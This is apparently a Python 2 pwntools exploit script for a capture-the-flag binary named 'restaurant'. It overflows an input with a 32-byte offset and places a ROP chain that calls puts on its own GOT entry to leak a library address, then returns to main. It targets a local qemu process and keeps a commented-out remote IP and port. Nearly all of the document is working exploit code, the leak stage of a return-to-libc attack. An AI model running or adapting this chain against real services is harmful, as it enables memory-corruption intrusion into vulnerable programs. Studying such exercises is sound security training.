#!/usr/bin/python2

import sys
import os
import re
import struct
from pwn import *

##use python2 not python3 for ease of generating strings for payloads 

################################################################################################################
#           Building Payload to Test Exploit Locally
#
#
################################################################################################################


exe="./restaurant"

elf=context.binary=ELF(exe, checksec=False)
context.log_level="debug"
pop_rdi=0x4010a3

pprint(elf.got)
final_payload=flat(
        {32:[
            pop_rdi,
            elf.got.puts,
            elf.plt.puts,
            elf.symbols.main
         ]}
)

print("final_payload", final_payload)




################################################################################################################
#           Testing Remote Exploit
#
#
################################################################################################################
x86_64_qemu_args=["qemu-x86_64", "-L", "/usr/x86_64-linux-gnu/"]

def q_start(argv=[], *a , **kwargs):
    if "remote" in argv:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process(x86_64_qemu_args +[exe], *a, **kwargs)


##remote exploit
#target=process("nc")
##target=remote("167.99.207.150", 30511)

##have to use sendline() not send() so that the trailing \n is appended to the bytes payload
##target.sendline(final_payload)
target=q_start()
##target=process("qemu-x86_64" -L /usr/x86_64-linux-gnu/")
#./restaurant")
#target=process(exe)

initial_payload=b'1'
target.recv()
target.sendlineafter("2. Drink something\x0a> ", initial_payload)
#target.sendline(initial_payload)
#target.wait()

#target.sendlineafter("You can add these ingredients to your dish:", final_payload)
target.sendlineafter("> ", final_payload)
ret_adr=target.recv()
print("ret_adr:", ret_adr)
target.interactive()

##target.recvuntil("Here's a small gift")
##flag=target.recv()

##success(flag)

##yy"You can add these ingredients to your dish:",
#🍅
##\xf0\x9f\x8d\x85
##1. 🍅
##\xf0\x9f\x8d\x85
#2. 🧀
##\xf0\x9f\xa7\x80
##You can also order something else.
